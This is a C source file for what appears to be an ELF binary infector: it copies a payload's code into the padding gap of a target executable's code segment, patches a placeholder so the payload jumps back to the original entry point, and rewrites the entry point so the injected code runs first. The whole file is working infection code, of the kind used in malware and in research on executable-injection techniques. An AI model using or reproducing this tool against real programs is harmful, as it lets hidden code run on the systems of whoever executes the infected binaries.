#include <stdio.h>
#include <stdlib.h>

#include <elf.h>

#include "logger.h"
#include "elf.h"

#define RET_PATTERN 0x1111111111111111

int main(int argc, char *argv[])
{
    int ret;
    int target_fd, payload_fd;
    int target_fsize, payload_fsize;
    char *target_path, *payload_path;
    void *target_data, *payload_data;

    Elf64_Ehdr *target_hdr;
    Elf64_Addr target_ep, target_base;
    Elf64_Phdr *target_text_seg;
    Elf64_Shdr *payload_text_sec;

    int gap_offset, gap_len;

    /* check args */
    if (argc != 3) {
        log_errf("usage: %s target payload", argv[0]);
        exit(1);
    }

    /* parse args */
    target_path = argv[1];
    payload_path = argv[2];

    /* open files */
    target_fd = open(target_path, O_APPEND | O_RDWR, 0);
    payload_fd = open(payload_path, O_APPEND | O_RDWR, 0);
    if (target_fd < 0 || payload_fd < 0) {
        log_perr("open");
        exit(1);
    }

    /* map file to memory */
    target_fd  = elfi_map(target_fd, &target_data, &target_fsize);
    payload_fd = elfi_map(payload_fd, &payload_data, &payload_fsize);

    /* TODO: check that elf is of type EXEC */

    /* get target binary entry point */
    target_hdr = (Elf64_Ehdr *) target_data;
    target_ep = target_hdr->e_entry;

    log_debugf("target entry point: %p", (void *) target_ep);

    /* elfi_dump_segments(target_hdr); */

    /* find executable segment and obtain offset and gap size */
    target_text_seg = elfi_find_gap(target_data, target_fsize,
                                    &gap_offset, &gap_len);
    if (target_text_seg == NULL) {
        log_err("failed to find gab");
        exit(1);
    }
    target_base = target_text_seg->p_vaddr;

    log_debugf("target base address: %p", (void *) target_base);

    payload_text_sec = elfi_find_section(payload_data, ".text");

    /* NOTE: not necessary? */
    target_text_seg->p_filesz += payload_text_sec->sh_size;
    target_text_seg->p_memsz += payload_text_sec->sh_size;

    log_debugf("payload .text section: %lx (%lx bytes)",
              payload_text_sec->sh_offset, payload_text_sec->sh_size);

    /* check size of payload vs gap */
    if (payload_text_sec->sh_size > (unsigned long) gap_len) {
        log_errf("payload to big, cannot infect file (%lu > %d)",
                 payload_text_sec->sh_size, gap_len);
        exit(1);
    }

    /* copy payload in the segment padding area */
    memmove(target_data + gap_offset,
            payload_data + payload_text_sec->sh_offset,
            payload_text_sec->sh_size);

    /* patch return address */
    ret = elfi_mem_subst(target_data + gap_offset,
                         payload_text_sec->sh_size,
                         RET_PATTERN, (long) target_ep);
    if (ret) {
        log_errf("failed to patch return address (%p)",
                 (void *) (target_data + gap_offset));

        close(target_fd);
        close(payload_fd);

        exit(1);
    }

    /* patch entry point */
    target_hdr->e_entry = (Elf64_Addr) (target_base + gap_offset);

    log_debugf("new target entry: %p", (void *) target_hdr->e_entry);

    log_infof("successfully injected payload at %p",
              (void *) (target_data + gap_offset));

    /* clean up */
    close(target_fd);
    close(payload_fd);

    return 0;
}
